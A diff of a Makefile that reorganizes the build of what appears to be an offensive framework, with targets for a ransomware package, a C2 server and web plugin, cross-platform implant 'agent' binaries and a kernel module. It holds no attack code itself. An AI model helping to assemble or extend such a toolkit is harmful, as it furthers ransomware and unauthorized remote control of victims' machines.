@@ -12,7 +12,7 @@
 
 .PHONY: setup build test lab-up lab-down proto clean lint release
 
-GO_PACKAGES := ./core/... ./shared/... ./cmd/...
+GO_PACKAGES := ./internal/... ./pkg/... ./cmd/... ./plugins/...
 PYTHON_MODULES := modules/ scripts/
 
 # === Setup ===
@@ -21,12 +21,16 @@ setup: setup-go setup-python setup-node
 
 setup-go:
 	@echo "[*] Installing Go dependencies..."
-	cd core/crypto && go mod tidy
-	cd core/agent && go mod tidy
-	cd core/orchestrator && go mod tidy
-	cd shared/config && go mod tidy
-	cd shared/logger && go mod tidy
-	cd shared/types && go mod tidy
+	cd internal/crypto && go mod tidy
+	cd internal/agent && go mod tidy
+	cd internal/orchestrator && go mod tidy
+	cd internal/ransomware && go mod tidy
+	cd internal/api && go mod tidy
+	cd internal/appstate && go mod tidy
+	cd internal/c2server && go mod tidy
+	cd pkg/shared/config && go mod tidy
+	cd pkg/shared/logger && go mod tidy
+	cd pkg/shared/types && go mod tidy
 
 setup-python:
 	@echo "[*] Installing Python dependencies..."
@@ -34,7 +38,7 @@ setup-python:
 
 setup-node:
 	@echo "[*] Installing Node.js dependencies..."
-	cd core/c2/web && npm install 2>/dev/null || true
+	cd plugins/pulse-c2/web && npm install 2>/dev/null || true
 
 # === Build ===
 build: build-x404x build-agent build-c2
@@ -47,17 +51,17 @@ build-x404x:
 
 build-agent:
 	@echo "[*] Building agent..."
-	cd core/agent && GOOS=linux GOARCH=amd64 go build -o ../../dist/agent-linux-amd64 ./cmd/agent
-	cd core/agent && GOOS=linux GOARCH=arm64 go build -o ../../dist/agent-linux-arm64 ./cmd/agent
-	cd core/agent && GOOS=windows GOARCH=amd64 go build -o ../../dist/agent-windows-amd64.exe ./cmd/agent
+	cd internal/agent && GOOS=linux GOARCH=amd64 go build -o ../../dist/agent-linux-amd64 ./cmd/agent
+	cd internal/agent && GOOS=linux GOARCH=arm64 go build -o ../../dist/agent-linux-arm64 ./cmd/agent
+	cd internal/agent && GOOS=windows GOARCH=amd64 go build -o ../../dist/agent-windows-amd64.exe ./cmd/agent
 
 build-c2:
 	@echo "[*] Building C2 server..."
-	cd core/c2 && make build 2>/dev/null || echo "  [!] C2 not available (submodule not cloned)"
+	cd plugins/pulse-c2 && make build 2>/dev/null || echo "  [!] C2 not available (submodule not cloned)"
 
 build-vault:
 	@echo "[*] Building kernel module..."
-	cd core/kernel/src && make 2>/dev/null || echo "  [!] Vault-Kernel not available"
+	cd plugins/kernel/src && make 2>/dev/null || echo "  [!] Vault-Kernel not available"
 
 # === Test ===
 test: test-go test-python
@@ -90,7 +94,7 @@ lab-status:
 # === Proto ===
 proto:
 	@echo "[*] Generating protobuf code..."
-	buf generate core/proto
+	buf generate pkg/proto
 	@echo "[+] Proto generation complete"
 
 # === Lint ===
@@ -109,7 +113,7 @@ lint-python:
 clean:
 	@echo "[*] Cleaning build artifacts..."
 	rm -rf dist/
-	rm -f core/kernel/src/*.ko core/kernel/src/*.o
+	rm -f plugins/kernel/src/*.ko plugins/kernel/src/*.o
 	find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true
 	find . -type f -name "*.pyc" -delete 2>/dev/null || true
 	@echo "[+] Clean complete"
